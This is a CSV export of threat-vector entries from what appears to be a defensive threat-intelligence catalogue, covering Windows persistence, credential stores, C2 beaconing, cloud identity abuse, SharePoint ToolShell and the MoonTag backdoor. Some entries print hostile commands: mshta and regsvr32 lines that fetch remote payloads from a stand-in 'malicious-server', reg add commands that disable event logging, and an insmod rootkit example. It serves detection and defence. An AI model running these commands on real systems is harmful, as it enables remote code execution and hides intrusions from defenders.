UUID,Name,Type,Tlp,Description,Version,Created,Modified,Childs,Parents,Chaining,Threat Actors,ATT&CK
8934c19a-954b-4dce-8081-0a6acca599f6,Malicious container image deployed,Threat Vectors,clear,"Threat actors plant malicious code into container images which 
execute in target environment. This vector is used to perform 
cryptominning activities and as a persistence technique.
",1,2022-07-04,2025-10-01,,,,,"T1525, T1204.003"
08b47a3b-fe90-4c9e-97f0-aa7bae361db1,Scheduled tasks to connect to adversarial infrastructure,Threat Vectors,clear,"A scheduled task is a task that is set to run automatically at a specific
time or interval. 

In the context of connecting to adversarial infrastructure,
a scheduled task would be a task that is set up to automatically establish
a connection to C2 infrastructure to check for 'orders' at a specified time
or interval. 

This could involve running a script that usually establishes an outbound 
connection. The exact details of how the task is set up would depend on the 
specific adversarial infrastructure being used and the tools and protocols 
available for connecting to it.
",4,2022-12-13,2022-12-16,,,,"[Enterprise] HAFNIUM, HAFNIUM",T1053.005
cce22952-735a-4255-8319-e5e44aef9d85,Windows startup folder abused by malware,Threat Vectors,clear,"The Windows Startup folder is a legitimate feature in Windows that allows
users to specify programs or applications to launch automatically when the
operating system starts. In several reports and analysis different threat
actors have been known to abuse this feature to achieve persistence and
evade detection on compromised systems. 

As a first step the malware is distributed by an initial threat vector, for
example spear-phishing attack. Once the malware is on the targeted system it
creates a shortcut or executable file in the Windows Startup folder
ref [5], [6].

There are several different possible startup locations which can be used
by the threat actors to run malicious programs. 

Examples:

- `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
- `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`.
- `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
- `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`

A recent campaign, ref [2], showed threat actors exploiting a vulnerability
in a software application  to deploy shortcut files in the startup folder,
that would point to the malicious executable.

When the user logs in or the system boots, Windows automatically executes
the programs or applications in the Startup folder. Usually the malware is
disguised as a legitimate program and runs in the background, often without 
the user's knowledge or consent.

### Techniques used by malware

- Shortcut files: Malware creates a shortcut file (.lnk) in the Startup
  folder, pointing to the malicious executable.
- Executable files: Malware places an executable file (.exe) directly in the
  Startup folder.
- Registry modifications: Some malware (Amadey) may also overwrite the 
Windows registry key, thush changing the startup folder to the ones 
containing its payload.
- Scripts - some threat actors have used the startup folder as a persistence 
mechanism to execute script files.
- Archive exploitation: WinRAR or crafted installers extract payloads into
  the Startup folder (notably CVE-2023-38831 exploited in the wild).

### Known malware families which can abuse a Windows Startup folder

- Ransomware: Some ransomware variants, like WannaCry and NotPetya, used
  the Startup folder to launch their malicious payloads.
- Trojans: Trojans, such as Emotet and TrickBot, have been known to use the
  Startup folder to maintain persistence on compromised systems.
- Adware/PUP: Adware or Potentially Unwanted Programs (PUPs), like the 
notorious Ask Toolbar, has been found to use the Startup folder to launch 
themselves.  
- LNK Loaders (e.g Gamaredon) ref [7].
",1,2025-08-21,2025-08-22,,,"{'sequence::succeeds': ['dd5d942c-bac4-4000-b9a6-ca4fef6cfb84'], 'atomicity::implements': ['86f62c3a-6556-4a64-a9f5-a79168ad42d9']}","RomCom, Gamaredon Group, [Enterprise] Gamaredon Group",T1547.001
7b122bb4-fc13-438b-a052-4388c501ec59,C2 beaconing on specific time intervals,Threat Vectors,clear,"C2 beaconing refers to the periodic communication between a compromised
system and a Command and Control (C2) server. The packets are sent from the
infected host to the C2 server at regular intervals, known as the `beacon
interval`, which can be down to the second to avoid suspicion. For example,
a Cobalt Strike beacon might have an average sleep of several seconds with
jitter added to disrupt the pattern. The compromised system, often is
referred as a ""beacon"" sends periodic signals or ""beacons"" to the C2 for
one of the following reasons ref [1].

- Check for new commands or updates
- Report back on its status or activities
- Receive instructions or configuration changes
- C2 beaconing on specific time intervals

To avoid detection, attackers often configure the compromised system to
beacon on specific time intervals.

### Possible C2 beaconing set-up

A threat actor can set C2 server to respond in one of the following ways.

- Fixed intervals: The beacon sends signals at fixed intervals, e.g., every
  5 minutes, 1 hour, or 24 hours.
- Randomised intervals: The beacon sends signals at randomised intervals,
  e.g., between 5-15 minutes, to make it harder to detect.
- Scheduled intervals: The beacon sends signals at specific times, e.g.,
  during business hours or when the system is most active.

### Threat actor's purposes

Attackers can set a specific timing or rules in their Command and Control
servers depends on different reasons and goals.

- Evade detection: By beaconing at regular intervals, the attacker can avoid
  detection by security systems that rely on anomaly detection or behavioral
  analysis.
- Maintain stealth: By using fixed or randomized intervals, the attacker can
  make it harder for security teams to detect the beaconing activity.
- Conserve resources: By only communicating at specific intervals, the
  attacker can conserve resources, such as bandwidth and system resources,
  on the compromised system.  
",1,2025-08-22,2025-08-26,,,,,"T1205, T1029"
d0522985-6001-4e25-a5ff-2dc87bf2fee8,Windows credential access attempt,Threat Vectors,clear,"Windows credential access refers to techniques used by threat
actors to steal authentication information such as passwords,
hashes, tokens, or Kerberos tickets stored on or transmitted
by Windows systems. These credentials enable unauthorized
access to systems, networks, or sensitive data, facilitating
lateral movement, privilege escalation, or persistent control.  

Threat actors exploit Windows credential access using various tools
and Living Off The Land Binaries (LOLBins) utilities to gain
unauthorized access to sensitive information.  

Windows credentials usually are stored in two main locations.

### Credentials folder (Windows Vault)

This folder stores encrypted copies of user credentials used
by Windows services, applications, and scheduled tasks.
Example for path storing credentials in Windows

`C:\Users\<username>\AppData\Local\Microsoft\Credentials`
`C:\Users\<username>\%LocalAppData%\Microsoft\Credentials\`

where <username> is the logged-in user's account name.  

### Credential Manager

It's location is not fixed. The store of the user credentisls
in this case may vary depending on the user account and other
system settings as language and preferences.  

The Windows OS has many different places it stores or caches its 
credentials, such as:  

- Security Accounts Manager (SAM) database. 
The SAM database is a file present on all Windows systems. This file 
contains all accounts created, as well as all built-in accounts.
Passwords are stored here as hashes. (NT password hash) 
- Other Files 
Passwords can also be found in configuration files and user created files 
(usually plaintext). Certain log files may contain credential information,
such as installer logs, and can also sometimes be found in crash reports. 
- Cached Credentials 
Domain credentials are cached in the registry to allow users to log into their
system when it is not connected to the domain. The Windows system caches the last
10 logon hashes, and some store up to 25 by default. This number is configurable. 
- Local Security Authority Secret (LSA) 
LSA secrets are stored in the registry and allow services to run with user privileges.
This includes VPNs, scheduled tasks, auto-logins, backup service accounts, IIS websites, etc.
They are included in the Security/Policy/Secrets registry in encrypted form. 
- Local Security Authority Subsystem Service Process (LSASS) 
When logging into a Windows machine, credentials are stored in the LSASS process in memory. 
This is primarily used to allow the user to access other resources on the network that they
are authorized to access without having to re-authenticate. The stored formats can be
plaintext (reversable encryption), NT and LM hash, and Kerberos tickets. 
- Credential Store Manager 
The manager is available with Windows 7 and higher. It is basically a digital vault that 
allows users to store user credentials “safely.” All the credentials are stored in a 
specific folder on the Windows system. Windows and Web credentials can be stored here. 
- AD Domain database (NTDS.DIT)
This database stores all credentials for users and computers located on every
AD Domain controller server in an active directory domain environment. (%SystemRoot%\NTDS folder) 

### Known used tools for Windows credential dumping and access ref [1]

- Mimikatz: A popular tool used to extract plaintext passwords,
hash, PIN codes, and Kerberos tickets from memory. It can also
perform pass-the-hash, pass-the-ticket, and build Golden Tickets.
- CrackMapExec: An open-source hacking tool for Windows Active
Directory environments.
- Empire: a post-exploitation and adversary emulation framework
- BloodHound: An open-source tool that uses graph theory to reveal
the hidden and often unintended relationships within an Active
Directory environment. 
- Hashcat: A password cracking tool that can crack Windows hashes,
including NTLM and LM hashes.
- John the Ripper: A password cracking tool that can crack Windows
passwords using dictionary attacks, brute-force attacks, or rainbow
table attacks.
- PsExec: A tool that allows executing commands on remote systems,
which can be used to extract credentials.
- Built-in Windows OS utilities as reg.exe for registry access,
WMI Windows utility, cmd, tasklist and others. 

### Possible used LOLBins utilities ref [2]:

- Windows Credential Editor (WCE): A utility that allows modifying
Windows credentials, including adding new credentials or modifying
existing ones.
- cmdkey: A built-in Windows utility that allows managing cached
credentials, including adding, deleting, or listing credentials.
- runas: A built-in Windows utility that allows running commands
under a different user context, which can be used to exploit
credentials.
- PowerShell: A powerful scripting language that can be used to
exploit credentials, including using cmdlets like Get-Credential
or Invoke-Command.
- tasklist: A built-in Windows utility that can be used to list
running processes, including those running under different user
contexts, which can help identify potential credential
exploitation opportunities.
- wmic: A built-in Windows utility that provides a command-line
interface to the Windows Management Instrumentation (WMI) repository,
which can be used to exploit credentials.
",1,2025-02-03,2025-02-11,,,"{'sequence::preceeds': ['35c76d6c-2ac7-486e-b0b7-b56f6b110bec', '03cc9593-e7cf-484b-ae9c-684bf6f7199f', '3b1026c6-7d04-4b91-ba6f-abc68e993616', 'd5039f2c-9fcc-4ba3-ad6a-da8c891ba745']}","APT29, [Enterprise] APT29, [Mobile] APT28, APT28, [Mobile] APT28, [ICS] Lazarus Group, Lazarus Group, [ICS] Lazarus Group","T1003.002, T1110.003, T1557, T1550.002, T1110"
ce7194f8-2398-4e79-b964-162ca5ee175b,Secrets stored in repository,Threat Vectors,clear,"Secrets are digital authentication credentials such as encryption keys,
passwords, private keys, AWS secrets, Oauth tokens, JWT tokens, Slack
tokens, API secrets and others. Many of the organizations still keep
these secrets in plain-text hardcoded into source code, configuration
files or some of the configuration tools. (ref [1])    

Many developers use GitHub for personal projects and can happen to
leak by mistake corporate credentials even without rrealizing this.
Threat actors usually look first at the public repositories on GitHub,
and then at the ones owned by its employees. They use the collected data
to access company resources and databases and to compromise further the
infrastructure. They may use the collected data also for extortion
purposes threaten to publish it in public. (ref [2])  

This may pose a risk because the secrets could be stolen or leaked
without the knowledge of the internal staff. For example, they may be
accidentally or inadvertently committed in to the source code repository.
Once the secret is saved in history it is accessible and exposed to any 
malicious actor with read access.  

As a good practice make sure secrets are never stored in source code
and Software Control Management (SCM) or other configuration tools.
(ref [3])

Examples for secretes stored in repositories are:  

- Application Programming Interface (API) keys
- Database credentials
- Identity and Access Management (IAM) permissions
- Secure Shell (SSH) keys
- Certificates    

There is a growing need for organizations to centralize the storage,
provisioning, auditing, rotation and management of secrets to control
access to secrets and prevent them from leaking and compromising the
organization. Often, services share the same secrets, which makes
identifying the source of compromise or leak challenging. (ref [1])  
",1,2023-04-13,2024-04-12,,,,"[Mobile] LAPSUS$, LAPSUS",T1213.003
e1741a76-3df1-430a-8dda-5c6bc9c3e1dd,Paragon Spyware,Threat Vectors,clear,"Paragon Spyware, also known as Graphite, is a sophisticated surveillance tool developed 
by Paragon Solutions, an Israeli company founded in 2019. This spyware is designed to infiltrate 
encrypted messaging apps such as WhatsApp, Signal, Facebook Messenger, and Gmail, allowing 
law enforcement and intelligence agencies to intercept private communications.    

## Key Features    

- **Zero-Click Exploit**: Graphite uses a ""zero-click"" method, meaning it can infect 
a device without any action from the target.
- **WhatsApp Vulnerability**: The spyware exploits a vulnerability in WhatsApp, 
using a malicious PDF file to gain access to the device.
- **Data Extraction**: Once installed, Graphite can extract stored files, photos, 
and monitor communications across various platforms.
- **Cloud Upload**: The extracted data is uploaded to a cloud server, leaving no 
traces on the infected device.
- **Sandbox Escape**: The spyware can escape the Android sandbox to compromise other 
apps on the targeted devices.    

## Recent Developments    

In January 2025, WhatsApp patched a zero-day vulnerability that was being exploited 
by Paragon Spyware. The company notified approximately 90 Android users from over 
20 countries who were targeted, including journalists and activists.
",1,2025-03-26,2025-03-26,,,,,"T1430, T1636.003, T1189, T1513, T1633, T1068"
dcf021a5-2846-40b4-8189-2695a7a32b9a,Possible Smart App Control Evasion Attempt,Threat Vectors,clear,"Smart App Control is a cloud-powered security feature in Windows 11 designed to 
block malicious, untrusted, and potentially unwanted applications from running. 
It uses a combination of reputation checks and digital signatures to determine whether 
an application is safe to execute. If an app is not recognized or is considered 
risky, SAC blocks its execution.

## Main Evasion Techniques

**1. Registry Manipulation**
Registry manipulation is a common method in broader Windows attack vectors for disabling 
or bypassing security features. Adversaries may attempt to:
- **Disable or modify SAC-related registry keys** to weaken or turn off the feature.
- **Tamper with security policy settings** stored in the registry to lower protection levels.
  
**2. Code-Signing and Certificate Abuse**
One of the most prevalent methods to bypass SAC is to sign malware with a legitimate 
code-signing certificate. Attackers increasingly use Extended Validation (EV) certificates, 
which require identity verification, by impersonating legitimate businesses to obtain 
them. This allows malware to appear trustworthy and slip past SAC’s checks.

**3. Reputation-Based Evasion**
- **Reputation Hijacking:** Attackers repurpose trusted applications (like script interpreters) 
to load and execute malicious code without triggering alerts.
- **Reputation Seeding:** Attackers use seemingly innocuous binaries to trigger 
malicious behavior after a certain time or event.
- **Reputation Tampering:** Attackers alter parts of legitimate binaries to inject 
shellcode without losing their good reputation.

**4. LNK Stomping**
Attackers exploit the way Windows handles shortcut (LNK) files. By crafting LNK 
files with non-standard target paths or structures, they can remove the ""mark-of-the-web"" 
(MotW) tag before security checks are performed, allowing malicious payloads to 
bypass SAC.

**5. Social Engineering**
Attackers trick users into overriding security warnings or disabling SAC by posing 
as legitimate sources or using persuasive tactics.

**6. Living-Off-The-Land Binaries (LOLBins)**
Attackers abuse signed Microsoft-supplied binaries (e.g., `mshta.exe`, 
`rundll32.exe`, `regsvr32.exe`) to proxy execution of malicious scripts 
and payloads, which Smart App Control might not block if the binary is 
considered trusted.
",1,2025-06-12,2025-06-24,,,,,"T1112, T1195, T1204"
d5892ae6-d022-4ac8-858c-c2756067cdac,Malicious Code Execution with Windows Utilities,Threat Vectors,clear,"### 1. Msxsl.exe

**Description**: A command-line XSLT processor that can transform XML data using 
XSL style sheets. Attackers can craft malicious XSL files that execute arbitrary 
code when processed.

Example:

```
msxsl.exe input.xml malicious.xsl
```

### 2. Mshta.exe
**Description**: Executes Microsoft HTML Applications (HTA files). Threat actors use it 
to run malicious scripts hosted locally or remotely.

Example:

```
mshta.exe ""http://malicious-server/payload.hta""
```

### 3. Regsvr32.exe
**Description**: Registers and unregisters OLE controls like DLLs and ActiveX controls. 
Threat actors can use it to execute code via scripts.

Example:

```
regsvr32.exe /s /n /u /i:http://malicious-server/script.sct scrobj.dll
```",1,2024-11-04,2024-11-04,,,{'atomicity::implements': ['d5039f2c-9fcc-4ba3-ad6a-da8c891ba745']},"[ICS] FIN7, FIN7, [Enterprise] Cobalt Group, Cobalt, [Mobile] APT28, APT28","T1218.005, T1218.010"
53f4e2f0-7d11-4629-bb26-905993a589db,Azure - Storage account reconnaissance,Threat Vectors,clear,"Azure storage account reconnaissance refers to the initial phase of cyberattacks 
where adversaries gather information about target storage accounts to identify vulnerabilities 
and plan subsequent attacks. This threat vector is critical as it enables attackers 
to map out potential entry points and weak configurations in cloud storage environments.

### Techniques and Methods  
**Storage account discovery**:  
- Attackers use methods like DNS reconnaissance (e.g., searching `*.blob.core.windows.net` subdomains) 
and brute-forcing account names to identify active Azure storage accounts.  
- Publicly available tools such as **Microburst** and **BlobHunter** automate the 
enumeration of storage accounts and containers.  

**Public container/blob enumeration**:  
- Adversaries exploit misconfigured public access settings (e.g., containers set to ""container"" or ""blob"" access levels) 
to list and access sensitive data without authentication.  
- Techniques include analyzing DNS records, web page source code, and cloud metadata 
for storage account URLs.  

### Attack Implications  
Successful reconnaissance can lead to:  
1. **Data exposure**: Identification of publicly accessible containers with sensitive data.  
2. **Lateral movement**: Discovery of storage accounts linked to higher-privileged 
resources (e.g., Azure Functions) for token theft and privilege escalation.  
3. **Malware distribution**: Mapping storage accounts used for hosting malicious 
content via features like static websites.  
",3,2025-05-28,2025-09-08,,,"{'support::enabled': ['41f57a57-1ed6-407e-bb70-a0f6ab52af10', '2743bf18-3b86-4721-bf3e-153dcda0b149', 'b1593e0b-1b3b-462d-9ab6-21d1c136469d', '53063205-4404-4e6d-a2f5-d566c6085d96']}",,"T1530, T1078.004"
55227203-38dc-406b-943a-9c1c6023d1cd,SharePoint ToolShell vulnerabilities,Threat Vectors,clear,"SharePoint zero-day vulnerabilities, known also as `ToolShell` are affecting
on-premise Microsoft SharePoint servers, which enable the attackers to
execute code on SharePoint servers without authentication, bypassing
security mechanisms. This vulnerabilities are considered with a high
security risk because they may lead to a remote code execution (RCE)
and a fully compromise of a SharePoint environment. 

What is known until now for these vulnerabilities is that a threat actor
deploys initially a malicious ASPX file `spinstall0.aspx`, also knows as
`SharpyShell`. The malicious file purpose is to extract and leak
cryptographic secrets from the SharePoint server using a simple GET request.
The goal of the threat actor is to obtain the server's MachineKey
configuration, including the critical ValidationKey , which are essential
for generating valid payloads ref [1].    

With these keys, the attackers can effectively turn any authenticated
SharePoint request into a remote code execution opportunity, bypassing the
need for credentials and gaining full control of the server.  

The attacker then uses a tool called `ysoserial` to craft their own valid
SharePoint token for remote code execution with full persistence and no
authentication ref [2].

It was identified successful zero-day exploitation in the SharePoint systems
of at least seven Union entities. But those incidents were not considered
as severe incident because the Defender EDR blocked post-compromise attempts.
Based on the current analysis and investigation there was not detected any
leak of credentials used for post-exploitation activities.

At this moment Microsoft released new SharePoint patches to fix these
vulnerabilities. Microsoft has released security updates that fully protect
customers using all supported versions of SharePoint affected by these two
vulnerabilities. For more information about patching review the customer
guidance for SharePoint vulnerability ref [3],[4].   
",1,2025-07-28,2025-08-16,,,,"[Enterprise] Threat Group-3390, APT27, [Enterprise] ZIRCONIUM, APT31, [Mobile] MoustachedBouncer, Storm-2603","T1190, T1212, T1078"
4110c951-3120-49fb-b54b-3d3aa896296b,MoonTag backdoor,Threat Vectors,clear,"MoonTag is a new backdoor which appears to be recently uploaded
to VirusTotal. The backdoor seems to be in development phase and
uses the Microsoft Graph API, which is a set of APIs provided by
Microsoft for accessing various services and data ref [1].  

It is believed to have been created by a Chinese threat actor,
and it uses code samples for Graph API communication that were
shared in a Chinese language Google Group.

The malware code can be found at the Virus Total page - ref [2],
although none of the provided codes there appear completed.
It seems that several variants of the backdoor have been uploaded
to VirusTotal. All of the variants found contain functionality
for communicating with the MS Graph API. The malware code shows
further that the code uses a technique DLL side-loading in the
processes, for example SvcHostDLL ref [2].   

Examples: 

- install this dll as a Service host by svchost.exe, used by
rundll32.exe to call callback
- dll module handle used to get dll path in InstallService

The malware, which is named “Moon_Tag” by its developer 
is based on code published in a Google Group. All of the
variants found contain functionality for communicating
with the Graph API ref [3].  

MoonTag samples match a YARA rule named `MAL_APT_9002_SabrePanda`
that detects samples from the 9002 RAT malware family used by
a Chinese affiliated threat actor. There are no strong links
to attribute MoonTag to a specific threat actor, but based on
the reports and analytic pages MoonTag backdoor is written by
Chinese-speaking threat actor based on the Chinese language
used in the Google Group post and the infrastructure used
by the attackers ref [3].  

#### MoonTag backdoor known behavior:

- Persistence: The service installation ensures the backdoor remains
on the system across reboots.
- Camouflage: By using legitimate Windows processes like svchost.exe
and the netsvcs service group, it tries to blend in with the operating
system's normal operations.
- Remote Control: The service starts a command-line process (cmd.exe),
allowing an attacker to execute arbitrary commands on the target machine,
which could lead to further exploitation or system takeover.  
",1,2024-10-16,2024-10-24,,,{'sequence::preceeds': ['f3a392f7-3268-4c54-8bfa-8117b784f520']},,"T1219, T1036, T1574.001"
10663f4a-6432-4c8f-bd3a-eaa599bb474e,OneDrive API abuse to exfiltrate sensitive data,Threat Vectors,clear,"OneDrive API abuse to exfiltrate sensitive data occurs when attackers misuse legitimate 
Microsoft Graph API endpoints and OneDrive’s cloud storage features to steal confidential 
or sensitive information from an organization.

### How Does It Work?

1. **API Exploitation via Microsoft Graph**
  - Attackers use the Microsoft Graph API to access users’ OneDrive storage.
  - Common endpoints include:
    - `https://graph.microsoft.com/v1.0/users/{id}/drive` (to list drives)
    - `https://graph.microsoft.com/v1.0/drive/items/{item-id}/content` (to download files)
  - These APIs are normally used for legitimate cloud storage operations.

2. **OAuth and Application Permissions**
  - Attackers may compromise existing OAuth applications or create new ones.
  - By granting these applications broad permissions (like “Files.Read.All” or 
  “Files.ReadWrite.All”), attackers gain access to OneDrive files without direct 
  user interaction.

3. **Use of Trusted Cloud Services**
  - Data exfiltration is carried out through OneDrive, a trusted and widely used 
  cloud service.
  - This makes malicious activity harder to distinguish from normal business operations.

4. **Automated Exfiltration**
  - Attackers often use scripts or malware to automate the process of accessing 
  and transferring files via OneDrive.
  - This allows for large-scale, stealthy data theft.

### Attack Scenarios

- **Compromised Credentials:** An attacker gains access to an account with OneDrive 
API permissions.
- **Malicious OAuth App:** An attacker registers an OAuth app with excessive permissions 
and uses it to access OneDrive files.
- **Automated Scripts:** Attackers use PowerShell or other scripting tools to interact 
with the OneDrive API, extracting sensitive files at scale.
",1,2025-06-25,2025-06-25,,,,,"T1190, T1534"
19a7a12e-1c7a-4885-9359-56abd63c85c9,ADFS abuse,Threat Vectors,clear,"AD FS (Active Directory Federation Services) is a critical identity provider solution 
for secure SSO authentication, but it presents a significant attack surface for 
threat actors. Below is a comprehensive overview of ADFS abuse threat vectors, attack 
techniques, and real-world exploitation patterns based on current research and incident data.

### Memory Adapter Manipulation

Attackers with local administrative privileges on an AD FS server can modify AD 
FS-related .NET assemblies or configuration files (such as those in the Global Assembly Cache). 
By injecting malicious code or altering authentication logic in memory or on disk, 
they can compromise the authentication process, potentially allowing unauthorised access.

### Golden SAML Attacks

Attackers can steal or forge SAML tokens by accessing the AD FS token signing certificates. 
With these certificates, they can create valid SAML tokens impersonating any user, 
granting themselves unauthorised access to federated applications (such as Microsoft 365).

### Phishing & MFA Bypass

Phishing campaigns specifically target AD FS users, tricking them into entering 
credentials on fake login pages. Once credentials are harvested, attackers may intercept 
Multi-Factor Authentication (MFA) codes or session cookies in real time, bypassing 
MFA protections.

### Information Disclosure via Vulnerabilities
  
Historical vulnerabilities (like CVE-2017-0043) have allowed authenticated attackers 
to read sensitive information from AD FS servers via crafted XML requests. While 
many such vulnerabilities are patched, they highlight the risk of information leakage.

### Credential Reuse and Lateral Movement

Attackers who obtain AD FS credentials often find that these credentials are reused 
across other systems or SSO platforms. This allows them to move laterally within 
the victim’s environment, accessing multiple services.
",1,2025-06-24,2025-06-24,,,,,"T1556, T1133, T1606.002"
c698fc79-3ed6-44a7-a9d7-bc447600e4c3,Azure AD Connect abuse,Threat Vectors,clear,"Azure Active Directory (Azure AD) Connect abuse represents a critical threat vector 
in hybrid identity environments, enabling attackers to pivot from on-premises Active 
Directory to cloud environments. Below is a comprehensive analysis of the attack 
methods, techniques, and implications based on current research.    

### Attack Vectors 

**1. Credential Interception via MITM**  
Attackers can perform man-in-the-middle (MITM) attacks against Azure AD Connect's 
Password Hash Sync mechanism. By installing a rogue root CA certificate on the server 
and proxying traffic, they intercept Azure AD Connector credentials sent to `login.microsoftonline.com`. 
This enables extraction of NT hashes for domain users.  

**2. Server Compromise and Malicious Synchronization**  
Compromising the Azure AD Connect server (e.g., via phishing or exploits) allows attackers to:  
- Synchronize malicious objects (e.g., privileged user accounts) to Azure AD.  
- Elevate privileges in the cloud environment, gaining access to sensitive data 
and configurations.    

**3. Password Writeback Misconfiguration**  
Misconfigured Password Writeback permissions (e.g., granting reset rights to privileged 
on-premises accounts like Domain Admins) enables attackers to:  
- Reset passwords of high-privilege accounts via Azure AD.  
- Gain unauthorized access to on-premises resources (CVE-2017-8613).    

**4. Pass-through Authentication (PTA) Abuse**  
Attackers with access to the PTA agent server can:  
- Use tools like **AADInternals** to intercept authentication requests.  
- Register rogue PTA agents with compromised global admin credentials, harvesting 
credentials during authentication.    

**5. AZUREADSSOACC$ Account Exploitation**  
Threat actors leverage the `AZUREADSSOACC$` account's NTLM hash to:  
- Forge Kerberos tickets for synced users.  
- Pivot to Azure AD, especially when synced Global Administrator accounts exist and 
MFA is lax.    

**6. MSOL Account Abuse**  
The 'MSOL_[hash]' service account (used by Azure AD Connect) is a high-value target because it:  
- Has extensive on-premises and cloud permissions (e.g., password reset, DCSync capabilities).  
- Can reset passwords of synced admin accounts, leading to cloud and on-premises compromise. 
",3,2025-06-26,2025-09-08,,,{'support::enabled': ['2743bf18-3b86-4721-bf3e-153dcda0b149']},,"T1556.007, T1098.001, T1078.004"
dbbeb66b-cb18-4055-8af4-808a8efdc748,Disabling of Windows event logging through registry entries,Threat Vectors,clear,"Threat actors can disable Windows event logs by adding, deleting or modifying
registry entries manually or with commands in a command-line prompt. 

The threat actor may disable the Windows Event log events manually via
Event Viewer properties or with CLI commands to disable a specific event or
all of them. Threat actors may also use script files or PowerShell to change
the registry.

If the threat actors want to disable event logging manually via registry
entries, they have to find the associated GUID to the event that will delete. The
GUID can be taken for example from Event Viewer > Select specific event log
> Event Properties > in Details select ""XML view"". (example for GUID id:
Giud=""{BD12F3B8-4DE1-TR31-DE39RET84L12}"") After this the threat actor
navigates to the registry with the GUID that needs to delete and change
the value of the dword in the registry key ""Enabled"" to 0.

Example: 

1. Example for disabling the logging of all event logs via registry entry:

reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog"" /v Start /t REG_DWORD /d 4 /f

2. Example for disabling the logging of a specific event log via registry entry:

reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog[Log Name]"" /v TypesSupported /t REG_DWORD /d 0 /f

3. Manual change in the registry of the registry key ""Enable"" (dword value) to 0. 
  
  Registry: 
  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System

  Dword value change in the registry key ""Enable"":

  ""Enabled""=dword:0
  ""EnableProperty""=dword:0

Example for change of Audit policies in the registries:

psexec -s -i regedit (the command needs system-level access to run)
After that in HKLM\SECURITY\Policy\PolAdtEv registry hive in the registry
editor ""Edit Binary Value"", 16-bit (two-byte) values can be changed to
00 00 which means no audit. For example replace the data started with 
01 00 01 00 to 00 00 00 00

- 00 00 means no auditing
- 01 00 means success auditing
- 02 00 means failure auditing
- 03 00 means all auditing
",3,2022-12-22,2023-01-05,,,,"[Enterprise] APT29, UNC2452, [Mobile] Sandworm Team, GreyEnergy",T1562.002
83343a35-daa0-41a2-ae09-6876b3ef9c11,Malicious kernel module,Threat Vectors,clear,"Adversaries may attempt to modify Linux kernel parameters or load/unload kernel 
modules to alter system behavior, hide malicious activities, or install rootkits. 
By operating at the kernel level, attackers can gain persistent and stealthy 
control over a system, intercepting system calls, hiding processes, files, 
or network connections.  

For example, an attacker with root access might execute insmod malicious_module.ko 
to load a malicious kernel module that conceals their presence and activities. 
Kernel rootkits like Adore-ng or Suterusu are examples of tools used for such purposes. 
These rootkits can hide network connections, processes, and files, effectively 
masking the adversary's footprint on the system.
",1,2024-12-03,2024-12-03,,,,"[Enterprise] Turla, Turla, [ICS] APT38, Lazarus Group, [Mobile] APT28, APT28, [Mobile] APT41, APT41, [Enterprise] Equation, Equation Group","T1547.006, T1014"
97589310-35d6-4e7d-a8b5-2d6cfc6375f4,Unauthorized changes on shell configuration files,Threat Vectors,clear,"Attacker may change critical files on Unix-like systems,

* shell initialisation and configuration, such as:
  - `/etc/profile`, `/etc/shells`, `/etc/profile.d/*`, `/etc/bash.bashrc`, 
  `/etc/bashrc`, `/etc/zsh/zprofile`, `/etc/zsh/zshrc`, `/etc/zsh/zlogin`, 
  `/etc/zsh/zlogout`, `/etc/csh.cshrc`, `/etc/csh.login`,
* as well as root-owned configuration files, such as:
  * `/root/.bashrc`, `/root/.bash_profile`, `/root/.profile`, `/root/.zshrc`, 
  `/root/.zprofile`
* and user-specific files, such as:
  * `/home/*/.bashrc`, `/home/*/.zshrc`, `/home/*/.bash_profile`, 
  `/home/*/.zprofile`, `/home/*/.profile`, `/home/*/.bash_login`, 
  `/home/*/.bash_logout`, `/home/*/.zlogin`, `/home/*/.zlogout`

These files are typically executed whenever a user logs in or spawns a new 
shell session. By manipulating these files, attackers may:

1. **Introduce malicious code** by modifying the configuration files with 
the objective of dropping malware to the compromised system, such as 
Backdoors or Trojans.
2. **Alter system settings**: Changes to the configuration files can modify 
system settings, such as environment variables, PATH variables, or other 
critical settings, which can compromise the system's security and integrity.
3. **Disable security features** such as audit logging or access controls, 
to evade detection or gain unauthorized access to the system.
4. **Create unauthorized access**: Modifications to the configuration files 
can create unauthorized access points, such as adding new users or modifying 
existing user accounts.
",1,2025-01-17,2025-01-17,,,,"[Enterprise] TeamTNT, TeamTNT, [Mobile] Sandworm Team, GreyEnergy, [Mobile] APT28, APT28",T1546.004
670504aa-cfb8-4d1f-a5ad-16193822085f,Scheduled task creation using Azure CloudShell,Threat Vectors,clear,"Threat actors can use Azure CloudShell, which is accessible via the Azure
portal or the browser, to create scheduled tasks.

The path to the Action parameter of the scheduled task is set in the task.
Threat actors can also use the Azure CloudShell editor to edit and
visualize in a better format their code before deploying it.

For example, threat actors use ""New-ScheduledTaskTrigger"" cmdlet to create
a trigger for the new scheduled task and further ""New-ScheduledTaskAction""
cmdlet to create a specific action for the task. In the end the 
""Register-ScheduledTask"" cmdlet is used to create the scheduled task. 

$Trigger = New-ScheduledTaskTrigger -Daily -At <time: hh:mm>
$Action = New-ScheduledTaskAction -Execute ""PowerShell.exe"" -Argument ""-File C:\Scripts\My_task_script.ps1""
Register-ScheduledTask -TaskName ""My Task"" -Trigger $Trigger -Action $Action -RunLevel Highest
",4,2022-12-12,2022-12-20,,,,,T1053.005
78d80d14-7260-44b8-95e9-6cf3693b0024,Windows explorer used to search for files with credentials,Threat Vectors,clear,"Credential dumping is the process of extracting sensitive information, such
as passwords, normally in the form of a hash or a clear text content, as well
as any other secrets stored on the compromised host ref [1], [2].         

On Windows, the user's passwords and secrets can be stored in multiple
possible locations, accessible with Windows File Explorer.  

For example:

### Security Accounts Manager (SAM) database location

Location of the SAM database, contains the local users of the host as well
as the local groups: 

`%SystemRoot%/system32/config/SAM`

### Windows Security configuration file

Security config file contains LSA Secrets, for example DPAPI machine key,
account cleartext passwords for Windows services or scheduled tasks that
are configured on the host. Data Protection API (DPAPI) performs symmetric
encryption of asymmetric private keys and it's used by the operation system
to securely store passwords, encryption keys or any other type of sensitive
data ref [3], [4] and [5].        

`%SystemRoot%/system32/config/SECURITY`

